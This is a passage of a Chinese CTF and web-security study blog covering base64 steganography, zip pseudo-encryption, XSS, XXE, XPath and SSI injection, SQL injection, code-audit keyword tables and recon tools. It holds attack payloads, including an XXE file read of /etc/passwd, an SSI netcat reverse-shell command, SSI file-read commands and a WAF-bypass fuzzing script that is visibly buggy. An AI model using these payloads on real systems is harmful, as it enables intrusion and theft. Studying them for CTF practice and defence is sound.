base64</span><br><span class="line">a=(&quot;&quot;)</span><br><span class="line">mode=(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;)       #mode码表</span><br><span class="line">c=(&quot;&quot;)</span><br><span class="line">f = open(&quot;1.txt&quot;,&quot;r&quot;)                   #读取文件</span><br><span class="line">line = f.readline()</span><br><span class="line">while line:</span><br><span class="line">    if(&quot;=&quot; in line):</span><br><span class="line">        a=line.replace(&#x27;=&#x27;,&#x27;&#x27;)[-2:]     #去掉‘=’留下最后一个字符</span><br><span class="line">        print(a,end=&quot;&quot;)                 #这里用来检测是否出错了</span><br><span class="line">        num=(line.count(&#x27;=&#x27;))*2 </span><br><span class="line">        c=c+(bin(mode.index(a[0])).replace(&quot;0b&quot;,&#x27;&#x27;)[-(num):].zfill(num))        #这里是关键，对其进行查表对号，再进行二进制转换筛选</span><br><span class="line">        line = f.readline()</span><br><span class="line">    else:</span><br><span class="line">        line = f.readline()</span><br><span class="line">        continue</span><br><span class="line">f.close()</span><br><span class="line">for i in range (0,len(c),8):</span><br><span class="line">    print(chr(int(c[i:i+8],2)),end=&#x27;&#x27;)  #输出</span><br></pre></td></tr></table></figure><hr><h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>培根密码的特点:培根密码是5个一组的a,b或ab混合组成</p><h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><p>摩尔斯电码是利用“.”、“-”的多种组合来代表字符<br>将A替换为 . ,B替换为 - 就变成了</p><h3 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings &lt;要查找找的文件名称&gt;|grep flag  //常用查找命令</span><br><span class="line">base64 -d flag.txt   //base64解码</span><br></pre></td></tr></table></figure><p>在使用mount挂在命令时，ubuntu比kali好用（个人建议）</p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>用十六进制软件打开<br><code>压缩源文件数据区： 50 4B 03 04：头文件标记（0x04034b50）</code><br><code>14 00：解压文件所需 pkware 版本 </code><br><code>00 00：全局方式位标记（有无加密）</code><br><code>08 00：压缩方式 </code><br><code>5A 7E：最后修改文件时间 </code><br><code>F7 46：最后修改文件日期 </code><br><code>16 B5 80 14：CRC-32校验（1480B516）</code> <br><code>19 00 00 00：压缩后尺寸（25） </code><br><code>17 00 00 00：未压缩尺寸（23） </code><br><code>07 00：文件名长度 </code><br><code>00 00：扩展记录长度 </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件目录区：50 4B 01 02：目录中文件文件头标记</span><br><span class="line">3F 00：压缩使用的 pkware 版本</span><br><span class="line">14 00：解压文件所需 pkware 版本</span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line">08 00：压缩方式</span><br><span class="line">5A 7E：最后修改文件时间</span><br><span class="line">F7 46：最后修改文件日期</span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516）</span><br><span class="line">19 00 00 00：压缩后尺寸（25）</span><br><span class="line">17 00 00 00：未压缩尺寸（23）</span><br><span class="line">07 00：文件名长度</span><br><span class="line">24 00：扩展字段长度</span><br><span class="line">00 00：文件注释长度</span><br><span class="line">00 00：磁盘开始号</span><br><span class="line">00 00：内部文件属性</span><br><span class="line">20 00 00 00：外部文件属性</span><br><span class="line">00 00 00 00：局部头部偏移量</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件目录结束标志 ：50 4B 05 06：目录结束标记</span><br><span class="line">00 00：当前磁盘编号</span><br><span class="line">00 00：目录区开始磁盘编号</span><br><span class="line">01 00：本磁盘上纪录总数</span><br><span class="line">01 00：目录区中纪录总数</span><br><span class="line">59 00 00 00：目录区尺寸大小</span><br><span class="line">3E 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class="line">00 00 1A：ZIP 文件注释长度</span><br><span class="line"></span><br><span class="line">识别真假加密</span><br><span class="line">无加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00</span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为00 00</span><br><span class="line">假加密</span><br><span class="line">压缩源文件数据区的全局加密应当为00 00</span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00</span><br><span class="line">真加密</span><br><span class="line">压缩源文件数据区的全局加密应当为09 00</span><br><span class="line">且压缩源文件目录区的全局方式位标记应当为09 00</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/weixin_41687289/article/details/82695801">https://blog.csdn.net/weixin_41687289/article/details/82695801</a><br><a href="https://blog.csdn.net/qq_41420747/article/details/89672502">https://blog.csdn.net/qq_41420747/article/details/89672502</a></p><h2 id="gif文件格式破损"><a href="#gif文件格式破损" class="headerlink" title="gif文件格式破损"></a>gif文件格式破损</h2><p>使用HXD打开gif图片,与其他gif图片对比，会发现头部缺少了GIF8<br><img src="2.png"></p><hr><p>反汇编工具：<br>Ghidra，IDA，Windbg,Ollydbg,GDB</p><hr><p>gif介绍:<br><a href="https://dev.gameres.com/Program/Visual/Other%20/GIFDoc.htm">https://dev.gameres.com/Program/Visual/Other%20/GIFDoc.htm</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web总结</title>
      <link href="/2020/02/14/web/"/>
      <url>/2020/02/14/web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="安全网站及论坛："><a href="#安全网站及论坛：" class="headerlink" title="安全网站及论坛："></a>安全网站及论坛：</h1><p>看雪（<a href="https://bbs.pediy.com/%EF%BC%89">https://bbs.pediy.com/）</a><br>安全客（<a href="https://www.anquanke.com)/">https://www.anquanke.com）</a><br>freebuf（<a href="https://www.freebuf.com/%EF%BC%89">https://www.freebuf.com/）</a><br>安全牛（<a href="https://www.aqniu.com/%EF%BC%89">https://www.aqniu.com/）</a><br>安全内参（<a href="https://www.secrss.com/%EF%BC%89">https://www.secrss.com/）</a><br>绿盟（<a href="http://www.nsfocus.com.cn/%EF%BC%89">http://www.nsfocus.com.cn/）</a><br>先知社区（<a href="https://xz.aliyun.com/%EF%BC%89">https://xz.aliyun.com/）</a></p><p><a href="http://itsecgames.com/">http://itsecgames.com/</a><br><a href="http://damnvulnerableiosapp.com/">http://damnvulnerableiosapp.com/</a><br><a href="http://www.gameofhacks.com/">http://www.gameofhacks.com/</a><br><a href="https://defendtheweb.net/dashboard">https://defendtheweb.net/dashboard</a></p><hr><h1 id="常见攻击方式"><a href="#常见攻击方式" class="headerlink" title="常见攻击方式:"></a>常见攻击方式:</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p><code>XSS在线平台: https://xsshs.cn/xss.php</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>反射型<br>非持久化,需要欺骗用户自己去点击链接才能触发XSS代码(服务器中没有这样的页面)</p></li><li><p>存储型<br>存储型XSS,持久化,代码存储在服务器中的,如:个人信息,发表文章等地方,加入代码,没有过滤或过滤不严这些代码将存储到服务器中,用户访问该页面的时候触发执行。容易造成蠕虫,盗窃cookie。</p></li><li><p>DOM型<br>基于文档对象模型DOM(Document Object Model),DOM是一个与编程语言无关的接口,允许程序或脚本动态地访问和更新文档内容、结构、样式<br>运用DOM函数执行访问XSS平台的目的,通过DOM函数改变HTML的结构,<br>使用浏览器加载野蛮同时访问XSS平台,记录使用者的cookie</p></li></ol><ul><li>攻击点<br>url链接,任何输入框</li></ul><p>一般两种类型:</p><ol><li>来自内部的<br>web程序自身的漏洞,提交特殊的字符串(跨站语句),类似于sql注入,都是没有对用户输入作充分的检查和过滤</li><li>来自外部的</li><li>XSS之存储型<br>将恶意代码保存在目标网站,每次访问被攻击页面会弹出相应的信息提示,严重时可造成蠕虫攻击。<br>例如:<br> 在留言板写入XSS攻击代码,每次用户去查看该留言都会弹出XSS信息<br> 客户投诉功能上存在XSS型攻击,提交了恶意代码以后,系统管理员查看时恶意代码执行,窃取了客户资料,然而管理员毫不知情这就是典型的XSS</li></ol><ul><li><p>waf绕过<br>(1) 变化大小写绕过<br>(2) 编码绕过<br>(3) 混合绕过<br>(4) 长度绕过<br>(5) 属性绕过<br>(6) 嵌套绕过</p></li><li><p>查找攻击点<br>F12查找页面的请求链接,利用特殊字符和字母,特殊编码和字符遍历组合进行模糊测试.<br>例如: 内联注释进行fuzz,测试是否会被waf拦截<br>代码实现fuzz:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">fuzz_zs = [<span class="string">&#x27;/*&#x27;</span>,<span class="string">&#x27;*/&#x27;</span>,<span class="string">&#x27;/*!&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%00&#x27;</span>]</span><br><span class="line">fuzz_sz = [<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27; &#x27;</span>]</span><br><span class="line">fuzz_ch = [<span class="string">&quot;%0a&quot;</span>,<span class="string">&quot;%0b&quot;</span>,<span class="string">&quot;%0c&quot;</span>,<span class="string">&quot;%0d&quot;</span>,<span class="string">&quot;%0e&quot;</span>,<span class="string">&quot;%0f&quot;</span>,<span class="string">&quot;%0g&quot;</span>,<span class="string">&quot;%0h&quot;</span>,<span class="string">&quot;%0i&quot;</span>,<span class="string">&quot;%0j&quot;</span>]</span><br><span class="line">fuzz = fuzz_zs +fuzz_zz+fuzz_ch</span><br><span class="line">headers =&#123;</span><br><span class="line">    user-<span class="string">&quot;agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url_start = <span class="string">&quot;url&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> fuzz:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> fuzz:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> fuzz:</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> fuzz:</span><br><span class="line">                exp = <span class="string">&quot;/*!union&quot;</span> +a +b +c +d + <span class="string">&quot;select*/1,2,3&quot;</span></span><br><span class="line">                url = url_start +fuzz</span><br><span class="line">                res = requests.get(url=url,headers = headers)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Now URL :&quot;</span> +url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;Login&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Find Fuzz bypass :&quot;</span>+url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3></li><li><p>登录缺陷<br>例如: cookie设置存在被盗风险(cookie有规律)<br>找回密码存在设计缺陷</p></li><li><p>账户认证缺陷<br>如: 未登录凭证验证</p></li><li><p>会话管理缺陷</p></li><li><p>权限管理缺陷<br>(1) 平行越权: 权限类型不变,权限ID改变<br>(2) 垂直越权: 权限ID不变,权限类型改变<br>(3) 交叉越权: 改变ID,也改变权限</p></li><li><p>支付逻辑缺陷</p></li><li><p>AIP滥用<br>如:接口无限制枚举 -&gt;撞库<br>单独读取内存值数据来当做用户凭证</p></li></ul><h3 id="基于占的缓冲区溢出"><a href="#基于占的缓冲区溢出" class="headerlink" title="基于占的缓冲区溢出"></a>基于占的缓冲区溢出</h3><h3 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h3><p>介绍:<br>XXE(外部实体攻击): 类似于xss攻击,引入恶意脚本。xml可以访问外部的url资源,内部的系统文件</p><p>使用工具: burpsuite -&gt; collaborator,实体引用部放collaborator上生成的连接地址,如果后台访问了这个地址,便可捕获,说明服务器上存在xxe</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version= &quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span><span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>单引号(‘): 如果被注入的标签是属性值的一部分,那么输入’会引起解析异常<br><node attrib= '$inputValue'/><br>当用户输入的值为test’时,上述代码解析会产生异常<br>双引号(“): 用户注册时,会以xml来存储数据到xmldb数据文件中<br> <node attrib="$inputValue"/><br> 当用户输入的值为test” 时,产生异常<br>尖括号(&lt;&gt;): 当用户输入的内容包含开放或闭合的尖括号时,xml会解析异常,<br>当username为test&lt;,实例如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>test&lt;<span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>,可以用来注释内容,当username为test&lt;!– 时,示例如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>test<span class="comment">&lt;!--&lt;username&gt;</span></span><br><span class="line"><span class="comment">&lt;user&gt;</span></span><br></pre></td></tr></table></figure><p>与符号(&amp;):这个符号在xml中表示实体的意思,以分号结尾,同时用来引入一段内容或外部的文件,例如&test;这种格式,当username输入&amp;test时,xml会以实体来进行处理,因为没有分号结尾,所以会解析异常,示例如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;test<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>区段分隔符CDATA(&lt;![CDATA[/]]): 这个分隔符的意义在于xml解析器不会去解析<br>CDATA区段包含的字符(会被看作为字符数据,从而不会被解析为标记)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[&lt;test&gt;]]</span><br><span class="line">&lt;/node&gt;</span><br></pre></td></tr></table></figure><h3 id="CI注入"><a href="#CI注入" class="headerlink" title="CI注入"></a>CI注入</h3><p>php常见命令执行函数:<br>system(),exec(),shell_exec(),passthru()</p><ul><li>LDAP注入<br>LDAP介绍: 轻量级目录访问协议,是一种在线目录访问协议.主要用于目录中资源搜索和查询,是X.500的一种简便的实现. LDAP也有自己的查询语句进行查询</li></ul><ol><li>AND LDAP注入</li><li>OR LDAP注入</li><li>LDAP盲注</li></ol><h3 id="Xpath-注入"><a href="#Xpath-注入" class="headerlink" title="Xpath 注入"></a>Xpath 注入</h3><h3 id="Xpath介绍-主要是通过构建特殊的输入-将这些输入作为参数传入Web应用程序-通过执行Xpath查询而进行授权访问"><a href="#Xpath介绍-主要是通过构建特殊的输入-将这些输入作为参数传入Web应用程序-通过执行Xpath查询而进行授权访问" class="headerlink" title="Xpath介绍: 主要是通过构建特殊的输入,将这些输入作为参数传入Web应用程序,通过执行Xpath查询而进行授权访问."></a>Xpath介绍: 主要是通过构建特殊的输入,将这些输入作为参数传入Web应用程序,通过执行Xpath查询而进行授权访问.</h3><p>(若验证程序存放在xml文件中,其原理是通过查找user表中的用户名和密码的结果进行授权访问)<br>Xpath典型查询语句如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//users/user[loginID/text()=&#x27;xyz&#x27;and password/text()=&#x27;123test&#x27;]</span><br><span class="line"></span><br><span class="line">//如果传入类似&quot;or 1=1 or &quot;=&quot;的值,那么查询语句最终也会为true</span><br><span class="line">//users/user[loginID/text()=&quot;or 1=1 or&quot;=&quot; and password/text()=&quot;or 1=1 or&quot;=&quot;]</span><br></pre></td></tr></table></figure><h3 id="SSI注入"><a href="#SSI注入" class="headerlink" title="SSI注入"></a>SSI注入</h3><p>(1) SSI介绍<br>从业务场景来Fuzz，比如获取IP、定位、时间等</p><p>识别页面是否包含.stm,.shtm和.shtml后缀<br>SSI指令基本格式：&lt;!-– 指令名称=”指令参数”&gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">①显示服务器端环境变量&lt;#echo&gt;</span><br><span class="line"></span><br><span class="line">//本文档名称：</span><br><span class="line"><span class="comment">&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">//现在时间：</span><br><span class="line"><span class="comment">&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">//显示IP地址：</span><br><span class="line"><span class="comment">&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">②将文本内容直接插入到文档中&lt;#include&gt;</span><br><span class="line"><span class="comment">&lt;!--#include file=&quot;文件名称&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#include virtual=&quot;index.html&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#include virtual=&quot;文件名称&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line">③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</span><br><span class="line">// 文件最近更新日期：</span><br><span class="line"><span class="comment">&lt;!--#flastmod file=&quot;文件名称&quot; --&gt;</span></span><br><span class="line">// 文件的长度：</span><br><span class="line"><span class="comment">&lt;!--#fsize file=&quot;文件名称&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line">④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;文件名称&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#exec cgi=&quot;文件名称&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">举例:</span><br><span class="line">```html</span><br><span class="line">&quot;--&gt;&#x27;--&gt;`--&gt;&lt;<span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br><span class="line">&quot;--&gt;&#x27;--&gt;`--&gt;&lt;<span class="comment">&lt;!--#exec cmd=&quot;nc x.x.x.x 1337 -e /bin/bash&quot;--&gt;</span></span><br></pre></td></tr></table></figure><p>看到shtml后缀，考虑SSI注入，直接来一波命令执行先列个目录，最后在上级目录找到关键信息。</p><!--#exec cmd="ls ../"--><p>接着读取即可获得flag<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--></p><p>(2) SSI防御<br>关闭服务器SSI功能<br>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</p><ul><li>cookie注入</li><li>host注入</li><li>referer注入</li><li>CRLF注入</li><li>代码注入</li><li>js注入</li><li>SQL注入<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3></li><li>数字型<br>注入不需要闭合前面的单引号</li><li>字符型<br>需要闭合前面的单引号</li><li>搜索型</li></ul><p>在URL或者表单中输入单引号或者其他特殊符号,页面出现错误说明存在SQL注入,如果页面正常显示说明有字符被过滤或不存在注入.<br>如果存在注入可进一步判断注入类型,在URL表单中输入<code>0 or 1</code>,如果可以查到数据,说明是数字型<br>如果输入0’ or 1#,查到数据说明是字符型注入.<br> get注入</p><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><p>XFF注入:SQL注入的一种，该注入原理是通过修改X-Forwarded-For头对带入系统的dns进行sql注入，从而得到网站的数据库内容。<br>X-Forwarded-For请求头格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:client, proxy1, proxy2</span><br></pre></td></tr></table></figure><h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><ul><li>代码审计<table><thead><tr><th>语言</th><th>工具</th></tr></thead><tbody><tr><td>php</td><td>RIPS、seay审计系统</td></tr><tr><td>java</td><td>finbugs、fotify</td></tr><tr><td>C++</td><td>cppcheck、flawfinder</td></tr><tr><td>JS</td><td>eslint</td></tr><tr><td>Go</td><td>golint、go tool vet、gas</td></tr><tr><td>python</td><td>pylint、bandit、py-find-injection、pyt</td></tr><tr><td><code>多种安全语言代码检查工具: sonar</code></td><td></td></tr></tbody></table></li></ul><table><thead><tr><th>漏洞名称</th><th>关键词</th></tr></thead><tbody><tr><td>密码硬编码、密码明文存储</td><td>password、pass、jdbc</td></tr><tr><td>XSS</td><td>getParamter、&lt;%=、param.</td></tr><tr><td>SQL 注入</td><td>Select、Dao 、from 、delete 、update、insert</td></tr><tr><td>任意文件下载</td><td>download 、fileName 、filePath、write、getFile、getWriter</td></tr><tr><td>任意文件删除</td><td>Delete、deleteFile、fileName 、filePath</td></tr><tr><td>文件上传</td><td>Upload、write、fileName 、filePath</td></tr><tr><td>命令注入</td><td>getRuntime、exec、cmd、shell</td></tr><tr><td>缓冲区溢出</td><td>strcpy,strcat,scanf,memcpy,memmove,memeccpy、Getc(),fgetc(),getchar;read,printf</td></tr><tr><td>XML 注入</td><td>DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser、SAXReader 、XMLReader、SAXSource 、TransformerFactory 、SAXTransformerFactory 、SchemaFactory</td></tr><tr><td>反序列化漏洞</td><td>ObjectInputStream.readObject、ObjectInputStream.readUnshared、XMLDecoder.readObject、Yaml.load 、 XStream.fromXML 、 ObjectMapper.readValue 、JSON.parseObject</td></tr><tr><td>url 跳转</td><td>sendRedirect、setHeader、forward</td></tr><tr><td>不安全组件暴露</td><td>activity 、 Broadcast Receiver 、 Content Provider 、 Service 、inter-filter</td></tr><tr><td>日志记录敏感信息</td><td>log log.info logger.info</td></tr><tr><td>代码执行</td><td>eval、system、exec</td></tr></tbody></table><h3 id="偏门攻击手法"><a href="#偏门攻击手法" class="headerlink" title="偏门攻击手法"></a>偏门攻击手法</h3><p>(1) 社会工程学攻击</p><ul><li>基础数据获取</li><li>技术手段</li><li>伪造身份<br>(2) 水坑攻击<br>寻找攻击目标的上网活动规律(寻找攻击目标经常访问的的网站的弱点,先将此网站植入攻击代码,攻击目标访问就会”中招”)</li><li>Flash漏洞进行钓鱼(CVE-2018-4878)</li><li>仿冒类似网站钓鱼攻击<br>(3) 模板漏洞分析<br>(4) 运营商的迂回攻击<br>(5) 服务产商劫持攻击<br>(6) “肉身投毒” 攻击</li><li>BadUSB<br>(7) 网线中间人攻击</li></ul><h2 id="键盘捕获-键盘按键输入记录"><a href="#键盘捕获-键盘按键输入记录" class="headerlink" title="键盘捕获(键盘按键输入记录)"></a>键盘捕获(键盘按键输入记录)</h2><p>智能手机传感器</p><h2 id="钓鱼wifi"><a href="#钓鱼wifi" class="headerlink" title="钓鱼wifi"></a>钓鱼wifi</h2><h2 id="窃听-嗅探"><a href="#窃听-嗅探" class="headerlink" title="窃听/嗅探"></a>窃听/嗅探</h2><h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>##whois 查询<br>whois: 查询域名ip以及所有信息传输协议(注册域名详细信息的数据库,如: 域名所有人,域名注册商)<br>站长之家查询备案信息:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://icp.chinaz.com/&#123;&#125;  <span class="comment"># ecjtu.edu.cn</span></span><br></pre></td></tr></table></figure><p>kali自带工具: whois<br>Python: whois模块 </p><hr><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="常用集成工具"><a href="#常用集成工具" class="headerlink" title="常用集成工具"></a>常用集成工具</h2><p>商业版:<br> appscan,awvs13<br>其他版:<br>xray,w3afNikto,Wfuzz,OWASP ZAP</p><h2 id="注入辅助工具"><a href="#注入辅助工具" class="headerlink" title="注入辅助工具"></a>注入辅助工具</h2><p>sqlmap,超级注入工具,穿山甲</p><hr><p><a href="https://blog.csdn.net/Eastmount/article/details/97784774">https://blog.csdn.net/Eastmount/article/details/97784774</a></p><h3 id="1-index-php"><a href="#1-index-php" class="headerlink" title="1. index.php"></a>1. index.php</h3><p>注意查看url<br>将url改为 index.php，会自动跳转到1.php，<br><img src="1.png"></p><hr><p>###2. 利用PHP伪协议读取源码：<br>index.php?page=php://filter/convert.base64-encode/resource=index.php</p><hr><h3 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h3><p>后台扫目录工具</p><ol><li>windows可以用国产的御剑</li><li>kali中扫目录工具<a href="DirBuster.md">Dirbuster</a><br><img src="2.png"></li><li>dirmap [介绍：] (_<a 